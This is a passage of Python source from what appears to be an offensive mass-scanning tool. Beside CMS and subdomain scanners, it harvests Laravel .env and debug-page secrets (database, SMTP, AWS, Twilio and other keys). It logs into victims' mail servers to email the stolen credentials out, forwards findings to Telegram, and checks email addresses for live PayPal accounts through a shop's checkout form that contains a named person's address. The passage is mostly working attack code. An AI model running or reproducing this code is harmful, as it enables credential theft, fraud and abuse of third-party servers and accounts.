            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Validator"
                )


        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def reverse_domain_to_ip(self, counter, length, url):
        try:
            reverse_domain_ip = self.set_result(filename="reverse_domain_to_ip.txt")
            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            try:
                ip = socket.gethostbyname(
                    target_url.replace("https://", "")
                    .replace("http://", "")
                    .replace("/", "")
                    .strip()
                )
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="IP Address: %s" % ip,
                    status=True,
                    mode="Reverse Domain to IP Address",
                )
                self.write_file(reverse_domain_ip, ip)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout!",
                    status=False,
                    mode="Reverse Domain to IP Address",
                )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
            pass
    def cms_scanner(self, counter, length, url):
        cms_regex = {
            "Wordpress": '(wp-content\/(themes|plugins|mu\-plugins)\/[^\n\s]+\.(js|css)|name\="generator"\scontent\="WordPress|\/xmlrpc\.php)',
            "Joomla": '(var\sJoomla|name\="generator[^\n]+Joomla!|\/com\_[a-z0-9]+\/)',
            "Drupal": '(\/sites\/default\/files|extend\(Drupal|node_link_text|name\="generator[^\n><]+(Drupal\s([^\s,]+)))',
            "MediaWiki": '(name\="generator[^\n]+MediaWiki|mediawiki\.(user|hidpi|searchSuggest)|Powered\sby\sMediaWiki|mw\.user\.tokens)',
            "PrestaShop": '(modules?\/(tmsearch|topbanner|gsnippetsreviews)\/(search|FrontAjaxTopbanner|views)|comparedProductsIds\=\[\]|var\scomparator_max_item|name\="generator"[^\n]+PrestaShop|license@prestashop\.com|@copyright[^\n]+PrestaShop|var\sprestashop_version)',
            "ZenCart": '(name\="generator[^\n]+(Zen\sCart|The\sZen\sCart|zen\-cart\.com\seCommerce)|products\_id\=[^=]+zenid|zencart\/|main_page=[^=]+cPath\=\d)',
            "vBulletin": '(name\="generator[^\n]+vBulletin|[^\n]"vbulletinlink|vb_login_[^\s]+|vbulletin\-core)',
            "Discuz": '(name\="generator[^\n]+Discuz|discuz_uid|discuz_tips)',
            "Magento": "(Mage\.Cookies\.)",
            "Invision": "(<([^<]+)?(Invision\sPower)([^>]+)?>|ipb\_[^\n'=\s]+)",
            "OpenCart": '(name\="generator[^\n]+OpenCart|index\.php\?route=(common|checkout|account)|catalog\/view\/theme\/[^\s\n]+\.(js|css|png|jpg))',
            "phpBB": '(name\="generator[^\n]+phpbb|Powered\sby[^\n]+(phpBB|phpbb\.com)|viewtopic\.php\?f=\d+)',
            "Whmcs": "(templates\/.*(pwreset|dologin|submitticket|knowledgebase)\.php)",
            "Moodle": "(\^moodle-/|moodle-[a-z0-9_-]+)",
            "YetAnotherForum": "(\syaf\.controls\.SmartScroller|\syaf_[a-z0-9_-]+)",
            "Jive": "(jive([^a-z]+)(app|Onboarding|nitro|rest|rte|ext))",
            "Lithium": "(LITHIUM\.(DEBUG|Loader|Auth|Components|Css|useCheckOnline|RenderedScripts))",
            "Esportsify": "esportsify\.com/([^.]+).(js|css)",
            "FluxBB": "(<p[^\n]+FluxBB)",
            "osCommerce": '(oscsid\=[^"]+)',
            "Ning": "(([a-z0-9-]+)\.ning\.com|ning\.(loader)|ning\._)",
            "Zimbra": '(\=new\sZmSkin\(\)|iconURL\:"\/img\/logo\/ImgZimbraIcon)',
        }
        #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        parse_url = urlparse(url)
        if parse_url.scheme:
            target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
        else:
            target_url = "http://{}".format(url)
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "TE": "Trailers",
            }
            http_request = requests.Session()
            response = http_request.get(
                url=target_url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=headers,
            )
            raw = response.content.decode(encoding="utf-8", errors="ignore")
            for cms, regex in cms_regex.items():
                try:
                    if re.search(r"%s" % regex, raw):
                        cms_name = self.set_result(filename="cms_%s.txt" % cms)
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=target_url,
                            message=cms,
                            status=True,
                            mode="CMS Scanner",
                        )
                        self.write_file(cms_name, target_url)
                        break
                    else:
                        check_cookies = http_request.cookies
                        if check_cookies.get("laravel_session"):
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Laravel",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_laravel.txt")
                            self.write_file(cms_name, target_url)
                            break
                        elif check_cookies.get("ZM_LOGIN_CSRF"):
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Zimbra",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_zimbra.txt")
                            self.write_file(cms_name, target_url)
                            break
                        elif check_cookies.get("ci_session"):
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Codeigniter",
                                status=True,
                                mode="CMS Scanner",
                            )
                            cms_name = self.set_result(filename="cms_codeigniter.txt")
                            self.write_file(cms_name, target_url)
                            break
                        else:
                            continue

                except Exception as Error:
                    print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))

        except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
            self.show_status_message(
                #time=time_now,
                counter=counter,
                length=length,
                data=target_url,
                message="Cannot Connect or Timeout",
                status=False,
                mode="CMS Scanner",
            )
        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def subdomain_enumeration_scanner(self, counter, length, domain):
        try:
            subdomain_live = self.set_result(filename="subdomain_enumeration.txt")

            parse_url = urlparse(domain)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(domain)

            url = (
                target_url.replace("http://", "")
                .replace("https://", "")
                .replace("/", "")
                .strip()
            )
            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "TE": "Trailers",
                }
                request = requests.get(
                    url="https://sonar.omnisint.io/subdomains/%s" % url, headers=headers
                )
                try:
                    parse_json = json.loads(request.text)
                    length_json = len(list(parse_json))
                except:
                    parse_json = False

                if parse_json:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Found %s Subdomain" % length_json,
                        status=True,
                        mode="Subdomain",
                    )
                    self.write_file(subdomain_live, parse_json)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Not Found",
                        status=False,
                        mode="Subdomain",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Cannot Connect or Timeout",
                    status=False,
                    mode="Subdomain",
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def paypal_validator(self, counter, length, email):
        try:

            paypal_live    = self.set_result(filename="paypal_live.txt")
            paypal_dead    = self.set_result(filename="paypal_dead.txt")
            paypal_limited = self.set_result(filename="paypal_limited.txt")

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url = "https://www.paypal.com/cgi-bin/webscr"
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://www.robertkalinkin.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.robertkalinkin.com/index.php?route=checkout/checkout',
                    'Upgrade-Insecure-Requests': '1',
                }
                data = {
                    'cmd': '_cart',
                    'upload': '1',
                    'business': 'indre@robertkalinkin.com',
                    'item_name_1': 'FANTASTIC TWINS IN LEO',
                    'item_number_1': '',
                    'amount_1': '114.88',
                    'quantity_1': '1',
                    'weight_1': '0.86',
                    'on0_1': 'Size - letters',
                    'os0_1': 'S/M',
                    'item_name_2': 'Shipping, Handling, Discounts & Taxes',
                    'item_number_2': '',
                    'amount_2': '31.12',
                    'quantity_2': '1',
                    'weight_2': '0',
                    'currency_code': 'EUR',
                    'first_name': 'Lesley J. Alford',
                    'last_name': '',
                    'address1': '3463 Nutter Street',
                    'address2': '',
                    'city': 'Overland Park',
                    'zip': '64110',
                    'country': 'US',
                    'address_override': '0',
                    'email': email,
                    'invoice': '12536 - Lesley J. Alford ',
                    'lc': 'en',
                    'rm': '2',
                    'no_note': '1',
                    'charset': 'utf-8',
                    'return': 'https://www.robertkalinkin.com/index.php?route=checkout/success',
                    'notify_url': 'https://www.robertkalinkin.com/index.php?route=payment/pp_standard/callback',
                    'cancel_return': 'https://www.robertkalinkin.com/index.php?route=checkout/checkout',
                    'paymentaction': 'sale',
                    'custom': '12536',
                    'bn': 'OpenCart_Cart_WPS'
                }
                send_requests = requests.post(url=url, data=data, headers=headers)
                decode_raw = send_requests.content.decode("utf-8")

                if email in decode_raw:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Live",
                        status=True,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_live, email)
                elif "your last action could not be completed" in decode_raw:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Limited",
                        status=False,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_limited, email)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=email,
                        message="Dead",
                        status=False,
                        mode="PayPal Validator",
                    )
                    self.write_file(paypal_dead, email)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=email,
                    message="Cannot Connect to PayPal Server",
                    status=False,
                    mode="PayPal Validator",
                )
                self.write_file(paypal_dead, email)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def get_laravel_database(self, counter, length, url):
        try:

            db_config_live = self.set_result(filename="laravel_database_live.txt")
            db_config_dead = self.set_result(filename="laravel_database_dead.txt")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text

                    #gggggg

                    try:
                        db_host = re.findall("DB_HOST=(.*)", config_value)[0]
                    except:
                        db_host = "-"
                    try:
                        db_port = re.findall("DB_PORT=(.*)", config_value)[0]
                    except:
                        db_port = "-"
                    try:
                        db_database = re.findall("DB_DATABASE=(.*)", config_value)[0]
                    except:
                        db_database = "-"
                    try:
                        db_user = re.findall("DB_USERNAME=(.*)", config_value)[0]
                    except:
                        db_user = "-"
                    try:
                        db_pass = re.findall("DB_PASSWORD=(.*)", config_value)[0]
                    except:
                        db_pass = "-"

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text
                        try:
                            db_host      = re.findall("<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_host = "-"
                        try:
                            db_port      = re.findall("<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_port = "-"
                        try:
                            db_database  = re.findall("<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_database = "-"
                        try:
                            db_user      = re.findall("<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_user = "-"
                        try:
                            db_pass      = re.findall("<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            db_pass = "-"
                        #except:
                            #config_value = False
                    else:
                        config_value = False

                if config_value:
                    db_manager = ['/adminer.php','/Adminer.php','/phpmyadmin']
                    for db_path in db_manager:
                        get_db = requests.get(url="".join([target_url, db_path]), timeout=5, verify=False)
                        db_raw = get_db.text

                        if "phpmyadmin.net" in db_raw:
                            db_url = "".join([target_url, db_path])

                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found PHPMyAdmin Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_live, append_db)

                        elif "Login - Adminer" in db_raw:
                            db_url = "".join([target_url, db_path])

                            build_db  = "# Login URL: %s\n" % db_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message="Found Adminer Config",
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_live, append_db)

                        else:
                            build_db  = "# URL: %s\n" % target_url
                            build_db += "# Database Host: %s\n" % db_host
                            build_db += "# Database Port: %s\n" % db_port
                            build_db += "# Database Name: %s\n" % db_database
                            build_db += "# Database Username: %s\n" % db_user
                            build_db += "# Database Password: %s\n\n" % db_pass
                            append_db = self.join_string(build_db)

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["Database Path Not Found", "Database Config Found"],
                                status=True,
                                mode="Laravel Database Scanner",
                            )

                            self.write_file(db_config_dead, append_db)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel Database Scanner",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel Config Scanner"
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def get_laravel_smtp(self, counter, length, url):
        try:

            #db_config_live = self.set_result(filename="laravel_database_live.txt")
            #db_config_dead = self.set_result(filename="laravel_database_dead.txt")

            smtp_live = self.set_result(filename="smtp_live.txt")
            smtp_dead = self.set_result(filename="smtp_dead.txt")

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://".format(url)

            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "TE": "Trailers",
            }

        #    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                url_config = "/".join([target_url, ".env"])

                get_config = requests.get(
                    url=url_config,
                    headers=headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=False,
                )

                if "APP_KEY" in get_config.text:
                    config_value = get_config.text

                    #"MAIL_HOST",
                    #"MAIL_PORT",
                    #"MAIL_ENCRYPTION",
                    #"MAIL_USERNAME",
                    #"MAIL_PASSWORD",
                    #"MAIL_FROM_ADDRESS",
                    #"MAIL_FROM_NAME",

                    try:
                        mail_host = re.findall("MAIL_HOST=(.*)", config_value)[0]

                    except:
                        mail_host = "-"

                    try:
                        mail_port = re.findall("MAIL_PORT=(.*)", config_value)[0]
                    except:
                        mail_port = "-"

                    try:
                        mail_user = re.findall("MAIL_USERNAME=(.*)", config_value)[0]
                    except:
                        mail_user = "-"

                    try:
                        mail_pass = re.findall("MAIL_PASSWORD=(.*)", config_value)[0]
                    except:
                        mail_pass = "-"

                    try:
                        mail_from = re.findall("MAIL_FROM_ADDRESS=(.*)", config_value)[0]
                    except:
                        mail_from = "-"

                else:
                    get_config = requests.post(
                        url=target_url,
                        data={"0x[]": "x_X"},
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False,
                    )

                    if "<td>APP_KEY</td>" in get_config.text:
                        config_value = get_config.text

                        try:
                            mail_host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]

                        except:
                            mail_host = "-"

                        try:
                            mail_port = re.findall("<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_port = "-"

                        try:
                            mail_user = re.findall("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_user = "-"

                        try:
                            mail_pass = re.findall("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_pass = "-"

                        try:
                            mail_from = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
                        except:
                            mail_from = "-"
                    else:
                        config_value = False

                if config_value:

                    if "mailtrap.io" not in mail_host and "-" not in mail_host:

                        #CLEAN_ADDR = mail_from if "-" not in mail_from elif "@"  else "j3mbotmaw0ttz@idx.id"
                        CLEAN_ADDR = mail_from if "-" not in mail_from else mail_user if "@" in mail_user else "cmdp4662@gmail.com"
                        #print(from_addr)
                        #if mail_from == "-":
                        #    mail_from = mail_user

                        mime = MIMEMultipart('alternative')
                        mime['Subject'] = "Legion 6.7 SMTP Checker (%s)" % CLEAN_ADDR
                        mime['From']    = email.utils.formataddr(("legion", CLEAN_ADDR))
                        mime['To']      = self.SMTP_TEST

                        BODY_TEXT = "====================[ $$ FuckBot Laravel SMTP Scanner $$ ]====================\n"
                        BODY_TEXT += "# Host       : %s\n" % mail_host
                        BODY_TEXT += "# Port       : %s\n" % mail_port
                        BODY_TEXT += "# Username   : %s\n" % mail_user
                        BODY_TEXT += "# Password   : %s\n" % mail_pass
                        BODY_TEXT += "# From Email : %s\n" % CLEAN_ADDR
                        BODY_TEXT += "=========================================================================" + "\n"

                        _body_text_ = self.join_string(BODY_TEXT)

                        BODY_HTML = "<html>\n"
                        BODY_HTML += "<head>\n"
                        BODY_HTML += "<body>\n"
                        BODY_HTML += "<pre>\n"
                        BODY_HTML += BODY_TEXT
                        BODY_HTML += "</pre>\n"
                        BODY_HTML += "</body>\n"
                        BODY_HTML += "</html>\n"

                        _body_html_ = self.join_string(BODY_HTML)

                        plain = MIMEText(_body_text_, 'plain')
                        html = MIMEText(_body_html_, 'html')

                        mime.attach(plain)
                        mime.attach(html)

                        try:
                            server = smtplib.SMTP(mail_host, mail_port)
                            server.ehlo()
                            server.starttls()
                            server.ehlo()
                            server.login(mail_user, mail_pass)
                            server.sendmail(CLEAN_ADDR, self.SMTP_TEST, mime.as_string())
                            server.close()

                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Success"],
                                status=True,
                                mode="Laravel SMTP Scanner",
                            )
                            self.write_file(smtp_live, _body_text_)
                        except:
                            self.show_status_message(
                                #time=time_now,
                                counter=counter,
                                length=length,
                                data=target_url,
                                message=["|".join([mail_host, mail_port, mail_user, mail_pass]), "Failed"],
                                status=False,
                                mode="Laravel SMTP Scanner",
                            )
                            self.write_file(smtp_dead, _body_text_)
                else:
                    self.show_status_message(
                        #time=time_now,
                        counter=counter,
                        length=length,
                        data=target_url,
                        message="Config Not Found",
                        status=False,
                        mode="Laravel SMTP Scanner",
                    )

            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except (ConnectTimeout, ReadTimeout, Timeout, SSLError, ContentDecodingError, ConnectionError, ChunkedEncodingError, HTTPError, ProxyError, URLRequired, TooManyRedirects, MissingSchema, InvalidSchema, InvalidURL, InvalidHeader, InvalidHeader, InvalidProxyURL, StreamConsumedError, RetryError, UnrewindableBodyError, SocketTimeout, SocketHostError, ReadTimeoutError, DecodeError, AttributeError, ConnectionRefusedError):
                self.show_status_message(
                    #time=time_now,
                    counter=counter,
                    length=length,
                    data=target_url,
                    message="Can't Connect or Timeout!",
                    status=False,
                    mode="Laravel SMTP Scanner"
                )

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except Exception as Error:
            print("".join(traceback.format_exception(etype=type(Error), value=Error, tb=Error.__traceback__)))
    def credential_checker(self, counter, length, url):

        try:

            result_aws          = self.set_result("RESULT-AWS.txt")
            result_twilio       = self.set_result("RESULT-TWILIO.txt")
            result_plivo        = self.set_result("RESULT-PLIVO.txt")
            result_nexmo        = self.set_result("RESULT-NEXMO.txt")
            result_coinpayments = self.set_result("RESULT-COINPAYMENTS.txt")
            result_sendgrid     = self.set_result("RESULT-SENDGRID.txt")
            result_mailgun      = self.set_result("RESULT-MAILGUN.txt")
            result_office       = self.set_result("RESULT-OFFICE365.txt")
            result_ionos        = self.set_result("RESULT-IONOS.txt")
            result_mandrillapp  = self.set_result("RESULT-MANDRILLAPP.txt")
            result_database     = self.set_result("RESULT-DATABASE.txt")
            result_variable     = self.set_result("RESULT-VARIABLE.txt")
            result_mail_other   = self.set_result("RESULT-MAIL-OTHER.txt")


            #time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            }

            parse_url = urlparse(url)
            if parse_url.scheme:
                target_url = "{}://{}".format(parse_url.scheme if parse_url.scheme in ["http", "https"] else "http", parse_url.netloc)
            else:
                target_url = "http://{}".format(url)

            try:

                url_config = "/".join([target_url, "_profiler/phpinfo"])
                get_config = requests.get(url=url_config, headers=headers, allow_redirects=True, timeout=15, verify=False)

                if "PHP Variables" in get_config.text and "Environment" in get_config.text:

                    if "AKIA" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found AWS",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_aws, url_config)
                        self.telegram_send.send(messages=[result_aws])
                    elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found TWILIO",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_twilio, url_config)
                        self.telegram_send.send(messages=[result_twilio])
                    elif "PLIVO" in get_config.text or "plivo" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found PLIVO",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_plivo, url_config)
                    elif "NEXMO" in get_config.text or "nexmo" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Nexmo",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_nexmo, url_config)
                    elif "COINPAYMENTS" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found CoinPayments",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_coinpayments, url_config)
                    elif "SG." in get_config.text or "sendgrid" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Sendgrid",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_sendgrid, url_config)
                    elif "mailgun" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Mailgun",
                            status=True,
                            mode="Hidden Debug Results",
                        )
                        self.write_file(result_mailgun, url_config)
                    elif "office365" in get_config.text:
                        self.show_status_message(
                            #time=time_now,
                            counter=counter,
                            length=length,
                            data=url_config,
                            message="Found Office365",
                            status=True,
                            mode="Hidden Debug Results",
                        )
